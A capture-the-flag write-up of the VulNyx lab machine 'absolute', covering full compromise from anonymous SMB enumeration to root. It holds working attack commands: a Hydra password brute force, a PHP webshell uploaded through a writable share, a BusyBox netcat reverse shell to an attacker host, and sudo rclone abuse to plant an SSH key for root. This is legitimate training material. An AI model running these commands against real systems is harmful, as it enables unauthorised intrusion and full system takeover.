# absolute

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| absolute | d4t4s3c | Easy | VulNyx |

**Summary:** The absolute machine exposed an nginx web server on port 80 alongside a Samba service on ports 139 and 445, and anonymous SMB enumeration revealed a `web` share with read and write permissions that mapped to `/var/www/html/Uploaded-Backup-Files`, a subdirectory of the web root. An unauthenticated request to that directory returned a 401 response whose Basic authentication realm leaked the username `m.howard`, and Hydra recovered the matching password `slideshow` from rockyou.txt. Because the share remained writable without any credentials, a PHP webshell was uploaded through SMB and executed with the recovered HTTP credentials, yielding command execution as `www-data` and, through a BusyBox netcat payload, a fully interactive Penelope session. Sudo enumeration showed that `www-data` could run `/usr/bin/rclone` as root without a password, and since rclone operates on plain local filesystem paths when no remote is configured, it was abused to create `/root/.ssh` and copy a freshly generated ed25519 public key into the root `authorized_keys` file. SSH to localhost as root completed the compromise and exposed both flags.

---

## Reconnaissance

The engagement began by identifying the target on the local network and enumerating its TCP services.

1. An Nmap host discovery sweep located the target at `192.168.56.171`:

```zsh
~/projects/labs/nyx                                                                                      11:15:06  
❯ sudo nmap -sn -PR 192.168.56.0/24  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-07 11:15 +0700  
Nmap scan report for 192.168.56.100  
Host is up (0.00023s latency).  
MAC Address: 08:00:27:F8:BE:F0 (Oracle VirtualBox virtual NIC)  
Nmap scan report for 192.168.56.171  
Host is up (0.00058s latency).  
MAC Address: 08:00:27:91:11:D9 (Oracle VirtualBox virtual NIC)  
Nmap scan report for 192.168.56.1  
Host is up.  
Nmap done: 256 IP addresses (3 hosts up) scanned in 5.33 seconds  

~/projects/labs/nyx                                                                                    5s 11:15:12  
❯ ip=192.168.56.171  
```

2. A full TCP scan with service and script detection revealed nginx on port 80 and Samba on ports 139 and 445:

```zsh
~/projects/labs/nyx                                                                                      11:17:06  
❯ nmap -p- -sCV -Pn -T4 --min-rate 5000 $ip  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-07 11:17 +0700  
Nmap scan report for 192.168.56.171  
Host is up (0.00020s latency).  
Not shown: 65532 closed tcp ports (conn-refused)  
PORT    STATE SERVICE       VERSION  
80/tcp  open  http          nginx 1.22.1  
|_http-title: Welcome to nginx!  
|_http-server-header: nginx/1.22.1  
139/tcp open  netbios-ssn   Samba smbd 4  
445/tcp open  netbios-ssn   Samba smbd 4  

Host script results:  
| smb2-time:    
|   date: 2026-09-07T04:17:21  
|_  start_date: N/A  
|_clock-skew: -1s  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled but not required  
|_nbstat: NetBIOS name: ABSOLUTE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 13.84 seconds  
```

The HTTP surface only served the default nginx welcome page, so the Samba service stood out as the most promising entry point. The NetBIOS name `ABSOLUTE` confirmed the machine identity, and message signing being enabled but not required suggested that anonymous sessions would be accepted.

3. Null session authentication against the SMB service enumerated the exported shares, and the `web` share stood out because it granted read and write permissions:

```zsh
~/projects/labs/nyx                                                                                      11:20:17  
❯ nxc smb $ip -u '' -p '' --shares            
SMB        192.168.56.171  445    ABSOLUTE        [*] Unix - Samba (name:ABSOLUTE) (domain:ABSOLUTE) (signing:
False) (SMBv1:False) (Null Auth:True)  
SMB        192.168.56.171  445    ABSOLUTE        [+] ABSOLUTE\:    
SMB        192.168.56.171  445    ABSOLUTE        [*] Enumerated shares  
SMB        192.168.56.171  445    ABSOLUTE        Share           Permissions            Remark  
SMB        192.168.56.171  445    ABSOLUTE        -----            -----------            ------  
SMB        192.168.56.171  445    ABSOLUTE        print$                                  Printer Drivers  
SMB        192.168.56.171  445    ABSOLUTE        web             READ,WRITE             Website Directory  
SMB        192.168.56.171  445    ABSOLUTE        IPC$                                    IPC Service (Samba 4.
17.12-Debian)  
```

4. The `web` share was mounted anonymously with `smbclient` and its single file was downloaded, revealing the web root content:

```zsh
~/projects/labs/nyx                                                                                      11:22:49  
❯ smbclient -N //$ip/web  
Try "help" to get a list of possible commands.  
smb: \> recurse ON  
smb: \> prompt OFF  
smb: \> mget *  
getting file \index.html of size 935 as index.html (91.3 KiloBytes/sec) (average 91.3 KiloBytes/sec)  
smb: \> exit  

~/projects/labs/nyx                                                                                    13s 11:23:28  
❯ cat index.html    
<!DOCTYPE html>  
<html lang="en">  
<head>  
  <meta charset="UTF-8" />  
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>  
  <title>Restricted Area</title>  
  <style>  
    body {  
      background-color: #f4f4f4;  
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;  
      display: flex;  
      flex-direction: column;  
      align-items: center;  
      justify-content: center;  
      height: 100vh;  
      margin: 0;  
      color: #333;  
    }  

    .container {  
      background-color: white;  
      padding: 2em 3em;  
      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);  
      border-radius: 8px;  
      text-align: center;  
    }  

    h1 {  
      margin-bottom: 0.5em;  
      color: #b30000;  
    }  

    p {  
      font-size: 1.1em;  
      color: #555;  
    }  
  </style>  
</head>  
<body>  
  <div class="container">  
    <h1>Restricted Area</h1>  
    <p>Access is limited to authorized personnel only.</p>  
  </div>  
</body>  
</html>  
```

The page was a static placeholder titled `Restricted Area` with no useful hints, but it confirmed that the share content was the live web root. Anything written to the share would be served by nginx, which made the write permission a direct path to code execution if PHP processing could be reached.

5. The actual filesystem location of the share was resolved through `rpcclient`, which disclosed that the `web` share mapped to `C:\var\www\html\Uploaded-Backup-Files`, a subdirectory of the web root:

```zsh
~/projects/labs/nyx                                                                                      11:36:14  
❯ rpcclient -NU "" $ip -c "netshareenum"  
netname: web  
        remark: Website Directory  
        path:   C:\var\www\html\Uploaded-Backup-Files  
        password:  
```

6. A request to that subdirectory over HTTP confirmed it was exposed by nginx and protected by HTTP Basic authentication. Critically, the authentication realm leaked a valid username:

```zsh
~/projects/labs/nyx                                                                                      11:37:24  
❯ curl -I "http://$ip/Uploaded-Backup-Files/"  
HTTP/1.1 401 Unauthorized  
Server: nginx/1.22.1  
Date: Mon, 07 Sep 2026 04:38:05 GMT  
Content-Type: text/html  
Content-Length: 179  
Connection: keep-alive  
WWW-Authenticate: Basic realm="Welcome to m.howard server!"  
```

The realm string `Welcome to m.howard server!` disclosed the account name `m.howard`, giving the brute force a known principal to target.

---

## Initial Access

### HTTP Basic Authentication Brute Force

7. With a known username and a standard password list, Hydra attacked the Basic authentication on `/Uploaded-Backup-Files/` using the HTTP GET module and recovered the password within seconds:

```zsh
~/projects/labs/nyx                                                                                      11:40:28  
❯ hydra -l m.howard -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt $ip http-get /Uploaded-Backup-
Files/  
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organiz
ations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-07 11:40:46  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per tas
k  
[DATA] attacking http-get://192.168.56.171:80/Uploaded-Backup-Files/  
[80][http-get] host: 192.168.56.171    login: m.howard    password: slideshow  
1 of 1 target successfully completed, 1 valid password found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-07 11:40:50  
```

The credentials `m.howard:slideshow` unlocked the protected directory, satisfying the web tier of the attack. The SMB tier required no credentials at all.

### PHP Webshell Upload Through the Writable SMB Share

8. A minimal PHP webshell was written locally and uploaded into the `web` share through the same anonymous session used during enumeration:

```zsh
~/projects/labs/nyx                                                                                      11:40:50  
❯ echo '<?php system($_GET["cmd"]); ?>' > cmd.php  

~/projects/labs/nyx                                                                                      11:41:31  
❯ smbclient -N //$ip/web -c 'put cmd.php cmd.php'  
putting file cmd.php as \cmd.php (5.0 kB/s) (average 5.0 kB/s)  
```

9. Because the share mapped directly into the web root, the uploaded file was immediately reachable at `/Uploaded-Backup-Files/cmd.php`, and invoking it with the recovered Basic authentication credentials returned the result of `id`:

```zsh
~/projects/labs/nyx                                                                                      11:41:35  
❯ curl -s "http://$ip/Uploaded-Backup-Files/cmd.php?cmd=id" -u 'm.howard:slideshow'  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
```

Command execution was confirmed as `www-data`, the user running the PHP handler.

### Reverse Shell Through the Webshell

10. A BusyBox netcat reverse shell payload was URL encoded with `jq` and delivered through the webshell. The attacker host `192.168.56.1` on port 5555 was chosen as the callback address:

```zsh
~/projects/labs/nyx                                                                                      11:42:29  
❯ echo -n 'busybox nc 192.168.56.1 5555 -e /bin/sh' | jq -sRr @uri  
busybox%20nc%20192.168.56.1%205555%20-e%20%2Fbin%2Fsh  

~/projects/labs/nyx                                                                                      11:42:39  
❯ curl -s "http://$ip/Uploaded-Backup-Files/cmd.php?cmd=busybox%20nc%20192.168.56.1%205555%20-e%20%2Fbin%2Fsh" -u 'm.howard:slideshow'  
```

11. Penelope caught the callback and deployed its Python agent, providing a fully interactive PTY session as `www-data`:

```zsh
~/projects/labs/nyx                                                                                      11:42:06  
❯ penelope -p 5555                                                                                    
[+] Listening for reverse shells on 0.0.0.0:5555 -> 127.0.0.1 • 172.16.162.167 • 172.16.0.2 • 192.168.56.1  
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)  
[+] [New Reverse Shell] => absolute 192.168.56.171 Linux-x86_64 👤 www-data(33) 😍 Session ID <1>  
[+] ⭐ Agent deployed via /usr/bin/python3  
[+] Interacting with session [1] • PTY • Menu key F12 ⇐  
[+] Session log: /home/setyanoegraha/.penelope/sessions/absolute~192.168.56.171-Linux-x86_64/2026_09_07-11_43_03
-135-www-data_33.log  
──────────────────────────────────────────────────────────────────────────────────────────────────────────────── 
```

The first interactive shell on the target was now established as `www-data`, completing initial access.

---

## Privilege Escalation

### Sudo Privilege Enumeration

12. Sudo enumeration inside the shell revealed a single passwordless rule allowing `www-data` to run `/usr/bin/rclone` as root:

```zsh
www-data@absolute:~/html/Uploaded-Backup-Files$ sudo -l  
Matching Defaults entries for www-data on absolute:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
   use_pty  

User www-data may run the following commands on absolute:  
   (root) NOPASSWD: /usr/bin/rclone  
```

13. A quick look at the filesystem confirmed the position of the user flag and that only root held a login shell, so there was no intermediate user to transition through:

```bash
www-data@absolute:~$ pwd  
/var/www  
www-data@absolute:~$ ls -la  
total 16  
drwx------  3 www-data www-data 4096 Jul 11  2025 .  
drwxr-xr-x 12 root     root     4096 Jan  2  2025 ..  
drwx------  3 www-data www-data 4096 Jul 11  2025 html  
-r--------  1 www-data www-data   33 Jul 11  2025 user.txt  
www-data@absolute:~$ cat /etc/passwd | grep "sh$"  
root:x:0:0:root:/root:/bin/bash  
```

### Arbitrary File Operations as Root Through rclone

14. Running rclone through sudo printed its usage screen, confirming the binary executed with full root privileges and exposing the complete command surface:

```zsh
www-data@absolute:~$ sudo -u root /usr/bin/rclone  
Usage:  
  rclone [flags]  
  rclone [command]  

Available Commands:  
  about           Get quota information from the remote.  
  authorize       Remote authorization.  
  backend         Run a backend-specific command.  
  bisync          Perform bidirectional synchronization between two paths.  
  cat             Concatenates any files and sends them to stdout.  
  check           Checks the files in the source and destination match.  
  checksum        Checks the files in the source against a SUM file.  
  cleanup         Clean up the remote if possible.  
  completion      Generate the autocompletion script for the specified shell  
  config          Enter an interactive configuration session.  
  copy            Copy files from source to dest, skipping identical files.  
  copyto          Copy files from source to dest, skipping identical files.  
  copyurl         Copy url content to dest.  
  cryptcheck      Cryptcheck checks the integrity of a crypted remote.  
  cryptdecode     Cryptdecode returns unencrypted file names.  
  dedupe          Interactively find duplicate filenames and delete/rename them.  
  delete          Remove the files in path.  
  deletefile      Remove a single file from remote.  
  genautocomplete Output completion script for a given shell.  
  gendocs         Output markdown docs for rclone to the directory supplied.  
  hashsum         Produces a hashsum file for all the objects in the path.  
  help            Show help for rclone commands, flags and backends.  
  link            Generate public link to file/folder.  
  listremotes     List all the remotes in the config file.  
  ls              List the objects in the path with size and path.  
  lsd             List directories/containers/buckets in the path.  
  lsf             List directories and objects in remote:path formatted for parsing.  
  lsjson          List directories and objects in the path in JSON format.  
  lsl             List the objects in path with modification time, size and path.  
  md5sum          Produces an md5sum file for all the objects in the path.  
  mkdir           Make the path if it doesn't already exist.  
  mount           Mount the remote as file system on a mountpoint.  
  move            Move files from source to dest.  
  moveto          Move file or directory from source to dest.  
  ncdu            Explore a remote with a text based user interface.  
  obscure         Obscure password for use in the rclone config file.  
  purge           Remove the path and all of its contents.  
  rc              Run a command against a running rclone.  
  rcat            Copies standard input to file on remote.  
  rcd             Run rclone listening to remote control commands only.  
  rmdir           Remove the empty directory at path.  
  rmdirs          Remove empty directories under the path.  
  selfupdate      Update the rclone binary.  
  serve           Serve a remote over a protocol.  
  settier         Changes storage class/tier of objects in remote.  
  sha1sum         Produces a sha1sum file for all the objects in the path.  
  size            Prints the total size and number of objects in remote:path.  
  sync            Make source and dest identical, modifying destination only.  
  test            Run a test command  
  touch           Create new file or change file modification time.  
  tree            List the contents of the remote in a tree like fashion.  
  version         Show the version number.  

Use "rclone [command] --help" for more information about a command.  
Use "rclone help flags" for to see the global flags.  
Use "rclone help backends" for a list of supported services.  
```

The key insight is that rclone treats any path without a remote prefix as a local filesystem path. Since the binary ran as root, commands such as `mkdir` and `copyto` became arbitrary directory creation and arbitrary file copy operations with root ownership, and no configured remote or config file was needed at all.

15. An ed25519 key pair was generated as `www-data`, its public key was staged as an `authorized_keys` file, and rclone was used to create `/root/.ssh` and plant the key inside it:

```zsh
www-data@absolute:~$ ssh-keygen -t ed25519 -f /tmp/id_rsa -N "" -q  
www-data@absolute:~$ cat /tmp/id_rsa.pub  
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMdJePRqvK2LOdpj+kIrjyqsY0QSHD3mnIio0sJrMG2r www-data@absolute  
www-data@absolute:~$ cat /tmp/id_rsa.pub > /tmp/authorized_keys  
www-data@absolute:~$ sudo -u root /usr/bin/rclone mkdir /root/.ssh  
2026/09/07 07:39:15 NOTICE: Config file "/root/.config/rclone/rclone.conf" not found - using defaults  
 www-data@absolute:~$ sudo -u root /usr/bin/rclone copyto /tmp/authorized_keys /root/.ssh/authorized_keys  
2026/09/07 07:41:18 NOTICE: Config file "/root/.config/rclone/rclone.conf" not found - using defaults  
```

16. With the public key trusted by root, SSH access to localhost completed the escalation, and both flags were collected:

```zsh
www-data@absolute:~$ ssh -i /tmp/id_rsa root@localhost  
root@absolute:~# id;whoami;hostname  
uid=0(root) gid=0(root) grupos=0(root)  
root  
absolute  
root@absolute:~# cat /var/www/user.txt /root/root.txt    
97d...  
9ee...  
```

---

## Attack Chain Summary

1. **Reconnaissance**: Host discovery located `192.168.56.171` running nginx on port 80 and Samba on ports 139 and 445 under the NetBIOS name `ABSOLUTE`. Null session enumeration revealed a `web` share granting read and write permissions.

2. **Vulnerability Discovery**: `rpcclient` disclosed that the share mapped to `/var/www/html/Uploaded-Backup-Files` inside the web root, and an unauthenticated 401 response leaked the username `m.howard` through the Basic authentication realm. The share accepted anonymous writes.

3. **Exploitation**: Hydra recovered the password `slideshow` for `m.howard` against the protected directory. A PHP webshell uploaded through the anonymous SMB share executed under the recovered HTTP credentials, and a BusyBox netcat payload produced an interactive `www-data` session through Penelope.

4. **Internal Enumeration**: Sudo enumeration showed `www-data` could run `/usr/bin/rclone` as root without a password. Filesystem review confirmed the user flag under `/var/www` and that only root held a login shell.

5. **Privilege Escalation**: rclone, running as root on local paths, created `/root/.ssh` and copied a generated ed25519 public key into `authorized_keys`. SSH to localhost as root yielded uid 0 and both flags.
